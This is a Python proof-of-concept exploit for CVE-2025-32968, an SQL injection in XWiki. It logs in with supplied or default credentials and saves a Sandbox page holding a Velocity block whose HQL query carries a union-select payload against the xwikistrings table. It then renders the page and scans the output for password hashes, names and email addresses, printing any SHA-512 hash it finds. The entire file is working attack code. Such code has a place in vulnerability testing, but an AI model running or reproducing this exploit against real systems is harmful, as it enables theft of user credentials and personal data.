#!/usr/bin/env python3
import requests
import argparse
import sys
import re
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class XWikiSQLiExploit:
    def __init__(self, target, username, password):
        self.target = target.rstrip('/')
        self.session = requests.Session()
        self.session.verify = False
        self.username = username
        self.password = password
    
    def get_form_token(self, html):
        match = re.search(r'name="form_token"\s+value="([^"]+)"', html)
        if match:
            return match.group(1)
        match = re.search(r'data-xwiki-form-token="([^"]+)"', html)
        if match:
            return match.group(1)
        return None
    
    def login(self):
        login_page_url = f"{self.target}/bin/login/XWiki/XWikiLogin"
        try:
            resp = self.session.get(login_page_url)
            token = self.get_form_token(resp.text)
            if not token:
                print("[-] Failed to get form_token")
                return False
            
            login_url = f"{self.target}/bin/loginsubmit/XWiki/XWikiLogin"
            data = {
                "j_username": self.username,
                "j_password": self.password,
                "form_token": token,
                "xredirect": "/bin/view/Main/"
            }
            resp = self.session.post(login_url, data=data, allow_redirects=True)
            
            if "Log-out" in resp.text or "tmLogout" in resp.text:
                return True
            if "Invalid credentials" in resp.text:
                print("[-] Invalid credentials")
                return False
            check = self.session.get(f"{self.target}/bin/view/Main/")
            return "Log-out" in check.text or "tmLogout" in check.text
        except Exception as e:
            print(f"[-] Login error: {e}")
            return False

    def create_page_with_payload(self, space, page_name, content):
        edit_url = f"{self.target}/bin/edit/{space}/{page_name}?editor=wiki"
        try:
            resp = self.session.get(edit_url)
            token = self.get_form_token(resp.text)
            
            save_url = f"{self.target}/bin/save/{space}/{page_name}"
            data = {
                "content": content,
                "syntaxId": "xwiki/2.1",
                "title": page_name,
                "parent": "Main.WebHome",
                "form_token": token or ""
            }
            resp = self.session.post(save_url, data=data, allow_redirects=True)
            return resp.status_code in [200, 302, 303] or page_name in resp.url
        except Exception as e:
            print(f"[-] Create page error: {e}")
            return False

    def view_page(self, space, page_name):
        view_url = f"{self.target}/bin/view/{space}/{page_name}"
        try:
            resp = self.session.get(view_url)
            return resp.text
        except Exception as e:
            print(f"[-] View page error: {e}")
            return ""

    def exploit(self):
        payload = r"where 1<>'1\'' union select concat(XWS_NAME, 0x3a, XWS_VALUE) from xwikistrings #'"
        content = f"""{{{{velocity}}}}
$services.query.hql("{payload}").execute()
{{{{/velocity}}}}"""
        
        print(f"[*] Target: {self.target}")
        print(f"[*] Username: {self.username}")
        
        print("[*] Logging in...")
        if not self.login():
            print("[-] Login failed")
            return False
        print("[+] Login successful")
        
        page_name = "SQLiTestPoC"
        print(f"[*] Creating page {page_name} with SQL injection payload...")
        if not self.create_page_with_payload("Sandbox", page_name, content):
            print("[!] Page creation may have failed, trying to view anyway...")
        else:
            print("[+] Page created")
        
        print("[*] Viewing page to trigger SQL injection...")
        result = self.view_page("Sandbox", page_name)
        
        indicators = [
            ("password:hash:", "Password hash"),
            ("SHA-512", "SHA-512 hash"),
            ("first_name:", "User first_name"),
            ("last_name:", "User last_name"),
            ("email:", "Email address"),
        ]
        
        found = []
        for indicator, desc in indicators:
            if indicator.lower() in result.lower():
                found.append(desc)
        
        if found:
            print("[+] SQL Injection successful!")
            print(f"[+] Extracted data indicators: {', '.join(found)}")
            
            hash_match = re.search(r'password:hash:SHA-512:[a-f0-9:]+', result)
            if hash_match:
                print(f"[+] Password hash: {hash_match.group(0)[:80]}...")
            return True
        else:
            if "velocity" in result.lower() and "error" not in result.lower():
                print("[*] Page rendered but no obvious data extracted")
                print("[*] The vulnerability may still exist - check manually")
                return True
            print("[-] No indicators of successful injection found")
            return False

def main():
    parser = argparse.ArgumentParser(description="CVE-2025-32968 XWiki SQL Injection PoC")
    parser.add_argument("-t", "--target", required=True, help="Target URL (e.g., http://localhost:8080)")
    parser.add_argument("-u", "--username", default="AdminUserAdmin", help="XWiki username (default: AdminUserAdmin)")
    parser.add_argument("-p", "--password", default="admin123", help="XWiki password (default: admin123)")
    args = parser.parse_args()
    
    exploit = XWikiSQLiExploit(args.target, args.username, args.password)
    success = exploit.exploit()
    
    sys.exit(0 if success else 1)

if __name__ == "__main__":
    main()
